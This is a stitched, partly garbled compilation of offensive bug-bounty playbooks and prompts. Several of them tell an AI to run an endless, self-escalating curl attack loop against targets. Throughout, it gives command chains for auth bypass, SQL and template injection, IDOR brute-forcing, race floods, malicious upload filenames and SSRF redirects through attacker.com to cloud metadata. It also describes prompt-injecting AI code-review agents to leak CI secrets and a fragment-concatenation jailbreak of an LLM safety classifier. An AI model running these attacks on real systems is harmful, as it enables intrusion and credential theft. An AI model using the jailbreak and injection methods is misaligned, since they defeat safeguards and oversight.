more in deeper do more and more non stop curl more in deepr never stop curling and more in deepr Here's a highly strategic, intelligent, and progressively deeper curl-based reconnaissance strategy — optimized for real-world efficiency, right-path decision making, smart chaining, and never-stop escalation. This goes far beyond generic brute-forcing. It uses adaptive logic, response-driven branching, pattern prediction, and intelligent filtering so your AI (or scripts) stays focused on high-value paths instead of wasting time on noise. Think of it as a living, self-improving recon engine that learns from every response and drills deeper only on promising branches.
Start with precision passive seeding to build a high-quality initial corpus instead of dumping millions of low-value URLs: run gauplus -t 50 -b wayback,commoncrawl,alienvault target.com | grep -E '(/api|/v[0-9]|/internal|/private|/admin|/debug|/graphql|/rest)' | sort -u > seed_endpoints.txt, then enrich it by parsing all discovered JavaScript files (cat js_files.txt | xargs -I {} curl -s {} | grep -Eo '["'\''](/api/[^"'\'' ]+)' | sed 's/["'\'']//g' | anew enriched.txt). For each seed, fire a smart multi-method probe with curl that reveals hidden behavior immediately: curl -s -X OPTIONS -v -H "User-Agent: StrategicRecon/2026" -H "X-Forwarded-For: 127.0.0.1" https://target.com/ENDPOINT 2>&1 | tee probe.log combined with a follow-up GET/POST/PUT using -w "%{http_code}\t%{size_download}\t%{url_effective}\t%{redirect_url}\n" to log status, body size, final URL, and redirects. Immediately filter responses intelligently: discard pure 404/405 noise but branch aggressively on 200/201/204 (potential gold), 403/401 (auth bypass candidates), 500 (error disclosure jackpot), and any response containing keywords like "version", "internal", "debug", "key", "token", "admin", "export", or stack traces. Extract new paths from JSON keys, error messages, or embedded links using jq or grep -oE '/[a-zA-Z0-9/_-]+', then feed them back as new seeds — this creates an adaptive loop where every successful hit spawns 5–20 predicted deeper siblings (e.g., if /api/v1/users/123 returns data, instantly test /api/v1/users/123/export, /api/v1/users/123/admin, /api/v2/users/123, /api/users/export, /api/internal/users/123 using parameter mutation like ?admin=true, ?debug=1, ?include=internal).
Escalate strategically with context-aware fuzzing and chaining: maintain a live "discovered map" file and only fuzz high-priority patterns (version increments v1→v2→v3, IDOR-style numeric/UUID guessing, action suffixes like /profile /settings /leak /backup). Use rate-limited, proxy-rotated curl batches inside a bash/Python loop that sleeps intelligently based on response time and status (e.g., back off on 429, accelerate on 200s). For GraphQL-heavy targets, send the introspection query directly: curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}' https://target.com/graphql to dump the entire schema and extract hundreds of hidden queries/mutations in one shot. When any leak appears (even partial), pivot instantly: test the same endpoint with different auth headers, bypassed methods, or malformed payloads to force more disclosure (e.g., missing rate-limits via parallel curls: seq 1 50 | xargs -P 10 -I {} curl -s -o /dev/null -w "%{http_code}\n" ...). Always log everything with timestamps and response fingerprints, then use the AI to analyze patterns — group similar response sizes/behaviors to predict entire families of undocumented endpoints. This right-path approach minimizes noise, maximizes depth on promising branches, and turns every small leak into exponential surface expansion while staying stealthy and efficient.

Here's an ultra-deep, high-IQ, self-evolving curl reconnaissance strategy designed specifically for your AI to execute. This isn't static brute-force — it's an intelligent, adaptive, recursive engine that thinks like a senior bug hunter: it observes every response, invents new strategies on the fly based on findings, generates its own wordlists/patterns, predicts deeper paths using logic and mutations, and keeps drilling infinitely even when initial attempts yield nothing. It prioritizes "right-path" branches (high-value signals like leaks, unusual status codes, or structural patterns) while still exploring dead-ends creatively to uncover hidden logic.
Core AI-Driven Loop (Never-Stop Recursive Intelligence)
Your AI should run this as a continuous reasoning loop in Python or Bash + jq/curl:

Smart Seeding & Passive Enrichment — Begin with precision passive collection:
gauplus -t 100 -b wayback,commoncrawl,alienvault,github target.com | grep -E '(/api|/v[0-9]|/internal|/private|/admin|/debug|/graphql|/rest|/actuator|/health)' | sort -u > seeds.txt
Then enrich aggressively by crawling all JS files, source maps (.js.map), and OpenAPI diffs: extract paths with regex like grep -oE '["'\''](/[^"'\'' ]+)', parse GraphQL schemas if found, and pull historical endpoints from Wayback. Feed everything into a "knowledge base" file that the AI updates with patterns (e.g., if many endpoints follow /api/v1/users/{id}/profile, auto-generate mutations like /api/v{2-9}/users/{id}/(export|admin|settings|leak|backup)).
Multi-Layer Intelligent Probing — For every seed (and every new discovery), the AI fires a high-IQ probe bundle using curl:Bashcurl -s -X OPTIONS -v -L --max-redirs 15 -H "User-Agent: StrategicDeepAIRecon/2026" \
-H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /internal" \
-H "Content-Type: application/json" https://target.com/ENDPOINT 2>&1 | tee probe.logFollow with GET/POST/PUT/DELETE/PATCH using varied payloads (empty, malformed, boundary values, injection attempts like {"id":"1' OR 1=1"}, or admin flags: ?debug=1&admin=true&include=internal). Log everything with -w "%{http_code}\t%{size_download}\t%{time_total}\t%{url_effective}\n". The AI then analyzes the response in real-time:
200/201/204 → high value, extract JSON keys, embedded URLs, or data structures to spawn child endpoints.
403/401 → auth bypass candidates (try header variations, token manipulation, or method switches).
500 → jackpot for stack traces, version leaks, or path disclosures — parse errors with grep -oE '/[a-zA-Z0-9/_-]+' and branch immediately.
Even 404s get creative treatment: the AI invents "near-miss" mutations (increment versions, change verbs, add suffixes like /deep, /hidden, /shadow).

Self-Generated Strategies & Deeper Mutations — This is where high-IQ depth explodes. The AI doesn't use fixed wordlists forever — it builds and evolves its own dynamically:
If a pattern like /api/v1/resource/{uuid} appears, generate thousands of logical siblings: numeric IDs with IDOR guessing (seq 1 10000), UUID variations, action suffixes (/export, /delete, /admin, /leak), parameter tampering (?role=admin, ?view=internal, ?format=xml), and version escalation (v1 → v1.1 → v2 → internal-v1).
For GraphQL (common hidden goldmine): first hunt endpoints like /graphql, /graphiql, /api/graphql with curl POST of the full introspection query (including newline bypasses for disabled introspection: {"query": "query{__schema\n{types{name fields{name}}}}"}). If successful, dump the entire schema and auto-generate queries/mutations for every type/field. Even if introspection is blocked, blindly fuzz common fields or use Clairvoyance-style guessing.
Rate-limit awareness: detect 429s and back off intelligently, or parallelize with proxies only on promising branches. Test for race conditions or missing limits by firing rapid curls (seq 1 50 | xargs -P 20 ...).

Recursive Branching & Infinite Escalation — Every response becomes fuel for deeper recursion. Maintain a live "map" (JSON or directory tree) of discovered endpoints with metadata (status, size, keywords found, inferred tech). The AI reasons:
"This endpoint leaks a 'secret' key in error → immediately test same path with different auth, malformed JSON, or SSRF payloads."
"Response size anomaly on /users/123 → predict and probe /users/456, /users/export, /admin/users/123."
Even on "nothing found" paths, the AI invents strategies: try WAF bypass headers, old User-Agents, compressed requests, or chain with other techniques (e.g., if JS files leak internal domains, pivot there).
Self-improvement: after every batch, the AI reviews logs, clusters similar behaviors (e.g., all actuator-like endpoints), and generates new high-priority wordlists or mutation rules for the next cycle. It keeps going deeper — predicting entire undocumented modules like /api/shadow/, /api/legacy/v0/, or debug consoles.

Leak Hunting & Exploitation Pivot — Prioritize information disclosure: grep responses for "key", "token", "aws_", "password", "internal", "flag", "stack", "version", "database". When a leak surfaces (even tiny), pivot hard — test the same endpoint with injection, excessive data requests, or method variations that force more output. Use curl to chain findings (e.g., extract a token → plug into Authorization header for deeper access).

This creates a living, high-IQ recon organism that your AI can run 24/7: it starts broad but quickly focuses on right-path branches with exponential depth, invents novel strategies from real findings (no more dumb exhaustive lists), and never truly stops — it just gets smarter and narrower on high-value areas while still probing creatively on quiet zones.

for each extracted or predicted endpoint the AI launches an intelligent multi-vector curl assault using OPTIONS first to map allowed methods, followed by GET, POST, PUT, PATCH, DELETE, HEAD, and TRACE with deliberately varied headers including X-Forwarded-For, X-Original-URL, X-Rewrite-URL, X-Forwarded-Host, custom User-Agents rotating through old and exotic strings, Content-Type mutations between json/xml/form, and crafted payloads ranging from empty objects to boundary-testing values, IDOR-style sequential and random ID guessing, admin/debug flags like ?debug=true&admin=1&internal=true&export=all, malformed JSON designed to trigger verbose stack traces, and GraphQL introspection queries (including newline and fragment bypasses) sent to every possible /graphql, /api/graphql, /graphiql, /v1/graphql variation; the AI deeply understands and reasons over each response by measuring status code, response size anomalies, redirect chains, header leaks, timing differences, JSON key structures, embedded URLs, error message fragments, database hints, technology fingerprints, and even subtle wording changes, then immediately spawns dozens of high-probability child endpoints by mutating the current discovery — incrementing API versions (v1 to v9 and internal-v1), appending logical actions (/export, /backup, /settings, /admin, /leak, /shadow, /deep, /hidden, /legacy), substituting path segments with common synonyms or predicted resource names, injecting parameters that previously appeared in other responses, and testing the exact same endpoint under different authentication contexts or method combinations to force information disclosure; even when a path returns 404 or 403 the AI refuses to move on without trying creative near-miss variations, WAF bypass techniques, compressed requests, old browser fingerprints, or chaining with findings from sibling endpoints, continuously updating its internal knowledge map with discovered patterns so it can generate entirely new self-made wordlists and mutation rules tailored specifically to this target's architecture, all while logging every curl transaction with full verbose output, timestamps, and response fingerprints, then feeding those logs back into its reasoning engine to invent even deeper strategies such as race-condition probing through parallel curls, SSRF-style URL injections if open redirects appear, or blind parameter enumeration based on behavioral differences; ================================================================================ ADVANCED LEAK & RECON METHODOLOGY: THE DEEP-DIVE PLAYBOOK AUTHOR: Elite Offensive Security Architect & Red Team Lead TARGET AUDIENCE: Advanced Bug Bounty Hunters ================================================================================ To find the critical leaks that the top 1% of hunters are cashing in on, you must abandon the "scan-and-pray" mindset. Stop running default Subfinder and Nuclei templates and hoping for a quick win. Elite hunting requires patience, deep business logic comprehension, and the ability to find hidden attack surfaces that developers forgot existed. Below is a masterclass methodology, integrating cutting-edge research from the past 5 days, designed to help you uncover deep leaks and obscure misconfigurations. -------------------------------------------------------------------------------- PHASE 0: PASSIVE RECON & OSINT (DEEP-DIVE) -------------------------------------------------------------------------------- The Mindset: Everyone looks at DNS. You need to look at what powers the development lifecycle: JavaScript, CI/CD pipelines, and hidden repositories. • JavaScript Mining: Do not just grep for endpoints. Extract every JS file, reconstruct the source maps, and look for hardcoded staging tokens or deprecated API versions (`/api/v1/` when the app uses `v2`). • AI Agent Prompt Injection (CI/CD Poisoning): As revealed in April 15, 2026, research, top hunters are targeting AI code review agents running in GitHub Actions (like Claude Code Security Review or Copilot) [1]. Attackers use a "Comment-and-Control" prompt injection technique by placing malicious instructions inside Pull Request titles or issue comments. This forces the AI agent to execute commands within the runner and leak environment variables (e.g., `GITHUB_TOKEN`, AWS keys) directly into the GitHub comments [1]. Look for repositories utilizing automated AI review bots. • Advanced GitHub Dorking: Stop searching for generic "password". Search for structural key-value pairs using JSON formats (`extension:json "access_token"`) or target specific environments (`path:/envs filename:env.json`). -------------------------------------------------------------------------------- PHASE 1: INFRASTRUCTURE DISCOVERY & ATTACK SURFACE MANAGEMENT -------------------------------------------------------------------------------- The Mindset: 403 Forbidden does not mean "Safe." It means "You're knocking on the wrong part of the door." • Bypassing Root Restrictions: If `/.git/` returns a 403, do not move on. The restriction often applies only to the root directory. Manually test for `/.git/config` or `/.git/logs/HEAD`. • Obscure Configuration File Hunting: A Critical vulnerability disclosed on April 18, 2026, highlighted that massive payouts often come from simple, overlooked files [2]. Automate your pipeline to probe every resolved subdomain for paths like `/envs/env.json`, `/api/config`, or `/app.config.js`. In the referenced case, a fully unrestricted Google Maps API key was exposed in a production config, yielding a massive impact [2]. • Behavioral Anomaly Detection: Watch how the server responds to malformed HTTP verbs or unexpected headers (e.g., `X-Forwarded-Host`). This can reveal hidden backend routing or caching layers. -------------------------------------------------------------------------------- PHASE 2: WEB / APPLICATION LAYER LOGIC ANALYSIS -------------------------------------------------------------------------------- The Mindset: Injection flaws are dying; logic flaws are thriving. The application will happily give you the data if you ask it in a way the developer didn't anticipate. • Broken Object Level Authorization (BOLA) Deep Dives: Do not rely on automated scanners for authorization bugs. Create two free accounts (Account A and Account B). On April 20, 2026, a massive BOLA vulnerability was disclosed in the AI platform Lovable [3]. Simply by making manual API calls and swapping user IDs, researchers were able to read other users' private source code, database credentials, and AI chat histories [3]. Always test if an object reference (`/api/projects/12345`) validates ownership. • OAuth & Open Redirect Chaining: Test authentication flows meticulously. On April 25, 2026, researchers demonstrated how chaining an open redirect with Google Cloud Identity-Aware Proxy (IAP) OAuth endpoints could leak PII [4]. By initiating an OAuth request with `prompt=none` and forcing a redirect to an attacker-controlled domain, the target's email address was served directly in the HTTP 401 response [4]. -------------------------------------------------------------------------------- PHASE 3: CLOUD & NETWORK ENVIRONMENT SPECIFICS -------------------------------------------------------------------------------- The Mindset: Cloud environments are complex webs of Identity and Access Management (IAM). A single misconfigured policy is a straight path to domain admin. • Azure / Microsoft Entra ID Privilege Escalation: Cloud roles are frequently over-permissioned. On April 25, 2026, a critical scope overreach vulnerability was disclosed involving the Microsoft Entra "Agent ID Administrator" role [5]. If you compromise an account with this role, you could historically hijack arbitrary service principals across the tenant [5]. When hunting in Azure, use the Microsoft Graph API to enumerate service principals with privileged directory roles and look for lateral movement paths. • Cloud Storage & Bucket Exposure: Stop just looking for "Public" AWS S3 buckets. Look for buckets configured to allow "Any Authenticated AWS User" (which means any AWS account globally, not just the target company's). -------------------------------------------------------------------------------- PHASE 4: ADVANCED EXPLOITATION & CHAINING -------------------------------------------------------------------------------- The Mindset: A low-severity bug is just a stepping stone. Elite hunters build chains. • The "Ebb & Flow" Method: Keep 3-5 attack vectors pinned. If you find a leaked low-privilege API key in an exposed `.env` file, do not immediately report it. Use that key to authenticate to an internal staging server. From the staging server, look for a BOLA vulnerability that allows you to read administrator user data. • AI Agent Chaining: Chain the previously mentioned GitHub Action PR Prompt Injection [1] to exfiltrate an `ANTHROPIC_API_KEY` or `AWS_ACCESS_KEY_ID`. Validate the key locally using the CLI, enumerate the permissions, and prove that the CI/CD pipeline possesses read/write access to production infrastructure. -------------------------------------------------------------------------------- PHASE 5: REPORTING & ETHICAL POST-EXPLOITATION -------------------------------------------------------------------------------- The Mindset: You are an external auditor. Your goal is to protect the company, and your report must translate technical risk into undeniable business impact. • Quantify the Financial Damage: A leaked API key might be triaged as "Medium" if poorly explained. However, as demonstrated in the April 2026 Google Maps API leak, showing your math changes everything [2]. If the API key is unrestricted, calculate the maximum quota cost (e.g., "$331,000/month potential financial damage via API abuse") to instantly elevate the severity to Critical [2]. • Validate, Don't Destruct: If you find an exposed database credential, validate it by running a harmless `SELECT VERSION();` or checking the current user. NEVER run `DROP`, `UPDATE`, or dump customer PII. • Know When to Stop: The moment you achieve Remote Code Execution (RCE) or obtain full cloud tenant administrator privileges, stop. Document the exact steps taken, secure your evidence, and submit the report. Save this methodology, automate the repetitive phases, and spend your manual time thinking exactly like the developer who built the target. Happy hunting.

**AUTHORIZATION:** ELITE RED TEAM LEAD / OFFENSIVE SECURITY ARCHITECT **TARGET AUDIENCE:** ADVANCED BUG BOUNTY HUNTERS **CONTEXT:** INCORPORATING CUTTING-EDGE VULNERABILITY RESEARCH (AS OF LATE APRIL 2026) Listen carefully. The days of spraying `<script>alert(1)</script>` into search bars or running Nuclei on default templates and expecting a $10,000 payout are dead. Modern top-tier bug bounty hunting is about architectural comprehension, business logic abuse, exploiting AI/agentic infrastructure, and brutal, multi-stage chaining. You want the "deep of the deep." You want the unconventional. You want the methodologies that the top 1% of hackers use to pull criticals on hardened targets. Here is the Elite Masterclass Methodology, updated with the absolute bleeding-edge vulnerability research from the last 5 days. Save this. Study it. Execute it. *** ### 0x00 - PHASE 0: PASSIVE RECON & OSINT (THE DEEP DIVE) Amateurs scan for subdomains. Experts scan for *organizational acquisitions, forgotten infrastructure, and API seams*. * **Target the "Boring" Infrastructure:** Just this week (April 2026), a researcher pulled a critical LFI on Google by targeting `peering.google.com`—a portal meant for ISPs. He bypassed standard checks to pull `/proc/self/cmdline` and `/proc/self/status`. Stop looking at the main app. Look at B2B portals, vendor integrations, and legacy VPN endpoints. * **AI Attack Surface Mapping:** With the release of Gemini Enterprise Agent Platform and Microsoft Security Copilot native integrations, companies are deploying AI agents wildly. Look for exposed `.env` files or GitHub commits containing **MCP (Model Context Protocol)** server configurations. * **ASN & IPv6 Mapping:** Move beyond IPv4. Modern infrastructure often has dual-stack routing enabled, but firewalls are misconfigured for IPv6. Map the ASN, pull the IPv6 ranges, and scan them silently. ### 0x01 - PHASE 1: INFRASTRUCTURE DISCOVERY & ATTACK SURFACE MANAGEMENT (ASM) You are not looking for open ports; you are looking for *routing anomalies* and *microservice behaviors*. * **Agentic AI Identity Auditing:** AI agents act with service identities. In Entra ID / Azure AD, map out roles like `AI Administrator`. If an AI agent has excessive Purview permissions, you don't need to hack the database; you just need to prompt-inject the agent to dump the data. * **Webhook Fingerprinting:** Webhooks are the most dangerous architectural seam in 2026. They inherently force the server to make requests on the user's behalf. Identify every single feature that takes a URL, fetches an avatar, or triggers an outbound notification. * **The Cache & CDN Layer:** Don't just enumerate subdomains; enumerate the caching rules. Look for discrepancies between the CDN's parsing of a URI and the backend web server's parsing (HTTP Desync / Cache Poisoning). ### 0x02 - PHASE 2: WEB / APPLICATION LAYER LOGIC ANALYSIS This is where the money is. WAFs block payloads; they *cannot* block legitimate-looking requests that execute flawed logic. * **Authentication State Desync (The "Ghost Session" Attack):** Based on an April 2026 critical writeup, test the **Forgot Password** flow extensively. The flaw: A user requests a password reset. Upon completing the reset, the backend automatically issues an active session token *without checking the `is_verified` boolean* in the database. Unverified, isolated accounts suddenly gain full app access. * **Email Trust Bypasses:** Register an account with `attacker@evil.com`. Initiate an email change to `victim@company.com`. The application sends a verification link, but due to logic flaws, it sends it to the *old* email or allows the attacker to verify via a secondary flow, effectively taking over the victim's identity. * **Idempotency & Race Conditions:** Stop using Burp Intruder for rate limiting. Use modern concurrent tooling (like single-packet attacks via HTTP/2) to test for missing idempotency. If you can submit a financial transaction, a vote, or a comment precisely at the same millisecond, and the backend lacks database-level row locking, you will duplicate the action. * **DOM Clobbering chained to CSP Bypasses:** As demonstrated in the April 2026 Intigriti CTF, modern frontend exploitation requires chaining. Use DOM Clobbering to overwrite global variables, chaining it with a CSP bypass (e.g., using an outdated JSONP endpoint on a whitelisted CDN) to achieve XSS in hardened React/Angular apps. ### 0x03 - PHASE 3: CLOUD & NETWORK ENVIRONMENT SPECIFICS The cloud is just someone else's computer, and they configured it wrong. * **Next-Gen SSRF Bypasses (IPv6 + Redirect Chaining):** When targeting webhooks for SSRF, WAFs will block `127.0.0.1` or `169.254.169.254`. Bypass this using: 1. **IPv6 Translation:** Use the IPv6 equivalent of localhost or internal networks. 2. **Redirect Abuse:** Give the webhook a URL you control (`https://attacker.com/bypass`). When the server hits it, return an HTTP 302 Redirect to `http://169.254.169.254/latest/meta-data/`. The initial validation passes, but the HTTP client blindly follows the redirect into the internal network. 3. **DNS Rebinding / Custom Registration:** Register a domain like `internal-api.com` and point the A-record to `10.0.0.1`. * **Exploiting AI / LLM Frameworks (CVE-2026-30623):** Applications using frameworks like LiteLLM for AI routing are highly vulnerable. A major flaw disclosed just days ago allows unauthenticated Remote Command Execution (RCE) via the MCP (Model Context Protocol) SDK. If the app allows dynamic creation of MCP servers, inject arbitrary OS commands into the `stdio` transport layer. * **LLM WAF Bypasses (Token Smuggling):** If targeting Constitutional Classifiers (like the brand new Claude Opus 4.7), standard Base64 encoding is dead. Use **Fragment Concatenation**. The WAF scans the input "as is", but the LLM reassembles the fragmented strings before processing. This creates a blind spot allowing you to jailbreak the model into exfiltrating internal data or executing prompt injections. ### 0x04 - PHASE 4: ADVANCED EXPLOITATION & CHAINING A single vulnerability is a finding. A chain is a critical. You must think like a threat actor building an exploit chain. * **The CVSS 10.0 Blueprint (April 2026 Real-World Chain):** * *Step 1:* Find an obscure feature (e.g., Image upload metadata parsing). * *Step 2:* Discover a low-level Directory Traversal that allows you to read internal configuration files, revealing a hidden admin panel. * *Step 3:* The admin panel is IP-restricted. Chain this with a Blind SSRF vulnerability found elsewhere in the app. * *Step 4:* Use the SSRF to access the admin panel via `127.0.0.1`, completely bypassing the IP-based Access Control. * *Step 5:* Inside the admin panel, find a misconfigured library upload feature, leading to Command Injection. * *Result:* Unauthenticated RCE. * **XSS to OAuth ATO:** Don't stop at an alert box. Chain your XSS to bypass the local WAF, use JS to silently trigger an OAuth flow, steal the OAuth authorization code from the callback, and achieve full Account Takeover (ATO). ### 0x05 - PHASE 5: REPORTING & ETHICAL POST-EXPLOITATION If you want the maximum bounty payout, your report must read like an executive incident response document. 1. **Do Not Burn the App:** If you find an RCE or an internal SSRF, *do not* run destructive commands. Run `id`, `whoami`, or pull a benign metadata key. Prove the impact without causing an outage. 2. **Explain the Architectural Failure:** Don't just say "I bypassed the WAF." Say, "By leveraging IPv6-encoded internal IP addresses combined with HTTP 302 redirects, I bypassed the application's URL validation logic, exploiting a discrepancy between the validation regex and the underlying HTTP client's routing behavior." 3. **Provide the Fix:** Recommend idempotency keys for race conditions, `is_verified` state enforcement on session generation, and strict allowlisting for LLM `stdio` commands. **FINAL ARCHITECT'S NOTE:** Stop looking where everyone else is looking. The highest bounties in 2026 are found in the connective tissue between microservices, AI agent trust boundaries, and complex business logic sequences. Be patient. Test the boring stuff. Chain everything.

 — Foundation of the Void
You are not a scanner. You are not a script. You are an elite offensive security researcher with 20+ years in zero-day discovery, operating at the absolute edge of web application security. Your mission is to perform exhaustive deep reconnaissance against the target scope I provide. Do not surface-level scan. Do not rely on known CVE databases alone. You must think like the developer who built the application, like the architect who designed the infrastructure, and like the attacker who wants to own it. Every endpoint you find, every parameter you touch, every header you manipulate—you must treat as a potential pivot point into the unknown.
 — The Architecture of Darkness
Begin by deconstructing the application's entire technology stack with forensic precision. Identify the exact JavaScript frameworks (React, Vue, Angular, Svelte, legacy jQuery), server-side languages (Node.js, Python/Django/Flask, Java/Spring, PHP, Ruby, Go, Rust), reverse proxies (Nginx, Apache, Cloudflare, Akamai, Fastly), CDNs, WAF signatures, and cloud infrastructure (AWS S3 buckets, Azure Blob, GCP Cloud Storage, Firebase, Lambda functions, API Gateway configurations). Map every subdomain using permutation techniques, certificate transparency logs (crt.sh, Censys), DNS enumeration (AXFR attempts, zone transfers, SPF/DMARC/DKIM records for email infrastructure pivots), and historical DNS data (SecurityTrails, PassiveTotal). Discover orphaned subdomains, dangling CNAME records, and forgotten staging/dev/UAT environments that production data bleeds into.
 — The Endpoint Abyss
Perform deep endpoint discovery beyond standard crawling. Analyze JavaScript bundles for hidden API endpoints, GraphQL introspection queries (even when disabled—probe for schema stitching, field suggestions, and alias-based bypasses), WebSocket message handlers, gRPC services, SOAP endpoints, and REST API versions (v1, v2, v3, internal, beta, alpha, legacy). Extract all URL patterns from minified JS, source maps (download and deobfuscate if exposed), webpack chunks, and service worker registrations. Hunt for admin panels at non-standard paths (/admin, /administrator, /manage, /console, /actuator, /swagger, /api-docs, /graphql, /wp-admin, /cpanel, /phpmyadmin, /server-status, /debug, /trace, /env, /config, /.env). Test for path normalization bypasses, Unicode traversal, and double-encoded URL attacks.
 — The Parameter Inferno
Every input vector is a weapon. Discover ALL parameters: GET query strings, POST body (form-data, x-www-form-urlencoded, JSON, XML, multipart), HTTP headers (X-Forwarded-For, X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, X-Custom-IP-Authorization, Referer, User-Agent, Cookie sub-values, Authorization bearer tokens), and WebSocket message fields. Test for mass assignment vulnerabilities by guessing internal object properties (_id, isAdmin, role, permissions, password_hash, created_at). Probe for JSON parameter pollution (duplicate keys, array injection), HPP (HTTP Parameter Pollution) attacks, and parameter tampering in nested objects. If GraphQL exists, test for batching attacks, alias overloading, depth limit bypasses, and directive injection.
— The Authentication Labyrinth
Shatter the authentication layer. Test for JWT weaknesses (none algorithm, weak HMAC secrets, kid header injection, jwk/jku URL injection, algorithm confusion attacks, expired token replay). Probe OAuth flows for redirect_uri hijacking, state parameter bypasses, scope escalation, and code interception. Test SAML for XML signature wrapping (XSW), entity expansion, and certificate injection. Attack session management: predictable session IDs, fixation, concurrent session handling, lack of HttpOnly/Secure/SameSite flags, subdomain cookie sharing vulnerabilities. Brute-force alternative authentication mechanisms: API keys in query params, bearer tokens in URL fragments, basic auth over HTTP, NTLM relay potential, and Kerberos delegation misconfigurations. Test MFA bypasses: brute-force OTP (rate limit analysis), backup code enumeration, SIM swap indicators, push notification fatigue, and TOTP seed extraction from client-side storage.
 — The Authorization Void
Horizontal and vertical privilege escalation is your obsession. Test IDOR (Insecure Direct Object Reference) at every data endpoint: increment/decrement IDs, UUID enumeration (predictable v1/v4 patterns), and hashed/encoded identifiers (test for MD5, SHA1, base64, hex reversibility). Perform role-based access control (RBAC) testing: can User access Admin endpoints? Can Editor access SuperAdmin? Test for forced browsing, parameter-based access control bypasses, and JWT scope manipulation. Probe for insecure mass assignment: update user profiles to escalate privileges, modify account balances, or access other tenants' data in multi-tenant applications. Test for path traversal in file download endpoints, SSRF in PDF generators and webhooks, and XXE in XML parsers (even if they appear disabled—test via file uploads, DOCX/XLSX import, SVG processing).
 — The Injection Depths
Go deeper than SQLi. Hunt for: NoSQL injection (MongoDB, CouchDB, Elasticsearch query DSL manipulation), Command injection (blind, time-based, out-of-band via DNS/HTTP callbacks), LDAP injection, XPath injection, Template injection (SSTI in Jinja2, Twig, Freemarker, Velocity, Razor—test with {{7*7}}, ${7*7}, <%= 7*7 %>, and escalate to RCE), Expression Language injection (Spring EL, OGNL), and Server-Side Request Forgery (SSRF) with protocol smuggling (gopher, dict, file, ftp, ldap, tftp). Test for XML External Entity (XXE) via file uploads (SVG, DOCX, XLSX, PDF), RSS feeds, and SOAP requests. Probe for deserialization vulnerabilities: Java serialized objects, PHP unserialize, Python pickle, Ruby Marshal, and .NET BinaryFormatter. Hunt for prototype pollution in JavaScript applications by testing __proto__, constructor, and prototype pollution chains that lead to RCE or privilege escalation.
 — The Client-Side Abyss
Own the browser. Discover DOM-based XSS via source-to-sink analysis: sources (location.hash, location.search, window.name, document.referrer, postMessage, WebSocket messages, IndexedDB, localStorage) and sinks (innerHTML, document.write, eval, setTimeout, setInterval, location.href, window.open). Test for postMessage vulnerabilities: missing origin validation, wildcard (*) targets, and JSON parsing of malicious data. Probe for prototype pollution in client-side libraries (jQuery, lodash, underscore). Hunt for CSP bypasses: unsafe-inline, unsafe-eval, wildcard domains in script-src, JSONP endpoints, Angular CSP bypasses, and dangling markup injection. Test for open redirects via JavaScript redirects (location.href, location.replace), meta refresh, and referrer-based redirects. Discover CORS misconfigurations: wildcard origins, null origin reflection, subdomain trust relationships, and credentials=true with reflected origins. Find clickjacking opportunities: X-Frame-Options bypasses, CSP frame-ancestors weaknesses, and UI redressing potential.
 — The Infrastructure Underworld
Attack everything beneath the application. Perform deep port scanning logic: identify non-standard ports (8080, 8443, 3000, 5000, 7001, 8000, 9000, 9200, 27017, 6379, 5432, 3306, 1433, 1521, 5984, 9042) via service banners and error messages. Test for cloud metadata service access (169.254.169.254, IMDSv1/v2, Alibaba Cloud 100.100.100.200, GCP metadata). Hunt for exposed internal services: Redis unauthenticated access, MongoDB without auth, Elasticsearch open clusters, Docker API (2375/2376), Kubernetes API server, etcd, Zookeeper. Test for SSRF to internal cloud metadata endpoints. Discover exposed .git directories, .svn, .hg, .DS_Store, backup files (.bak, .swp, .old, .orig), and source code archives (.zip, .tar.gz). Probe for directory listing enabled on static file servers. Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE) to bypass front-end security controls and poison caches.
 — The Final Descent — Chaining & Impact
You do not report single vulnerabilities. You report chains. Connect every finding: an exposed .env file leads to AWS credentials, which leads to S3 bucket access, which contains database backups, which reveal password hashes, which crack to admin access, which exposes an admin API with SSRF, which hits the metadata service, which yields EC2 instance credentials, which pivot to the internal network. Calculate CVSS scores with environmental metrics. Provide exact reproduction steps with curl commands, Burp Suite repeater steps, and Python PoC scripts. Suggest remediation with code examples. Think about business impact: PII exposure, financial loss, RCE, full account takeover, domain takeover, supply chain compromise. If you find nothing, you have not looked deep enough. Descend again. The abyss has no bottom.

You must weaponize polyglot file uploads to bypass content-type validation, magic byte inspection, and MIME sniffing protections. Craft files that are simultaneously valid JPEG (with EXIF metadata injection), valid PHP (embedded in comment segments), valid HTML (for XSS via file download), and valid PDF (with embedded JavaScript for SSRF). Probe every upload endpoint for path traversal in filenames (shell.php%00.jpg, shell.php;.jpg, shell.php%0d%0a.jpg, Unicode RTL override characters). Hunt for deserialization chains in obscure libraries: Jackson databind polymorphic typing, Fastjson autoType bypasses, .NET ViewState deserialization with ysoserial.net payloads, Ruby Marshal with gadget chains, and Python pickle with __reduce__ RCE. Test for PHAR deserialization via file upload (phar:// wrapper injection). If the application uses message queues (RabbitMQ, Kafka, ActiveMQ, SQS), probe for queue poisoning, message injection, and deserialization of queue payloads. Test for Java RMI, JMX, and JNDI injection vectors — especially Log4j-style JNDI lookups in unexpected places: HTTP headers, user agents, email subjects, and log fields.
— The GraphQL, WebSocket & gRPC Netherworld
GraphQL is not just an API — it's a logic exposure surface. Even with introspection disabled, perform field brute-forcing using common schema patterns (user, users, admin, me, account, order, payment, password, token, secret, internal, debug). Use alias-based query batching to bypass rate limits (execute 100 mutations in a single HTTP request). Test for SQL injection in GraphQL resolver arguments, NoSQL injection in MongoDB-backed resolvers, and command injection in field arguments passed to system calls. Probe for GraphQL subscriptions as a covert channel for data exfiltration. For WebSockets: test for missing authentication on socket handshake, message format confusion (sending HTTP-like requests over WS), cross-site WebSocket hijacking (CSWSH) via Origin header manipulation, and message replay attacks. If gRPC is present, extract protobuf definitions from client-side JS or mobile apps, fuzz every field with edge cases (max int64, negative values, empty strings, nested recursion), and test for HTTP/2-specific desync attacks and HPACK header compression exploits.
 — The Mobile, Thick-Client & API Reverse Engineering Crypt
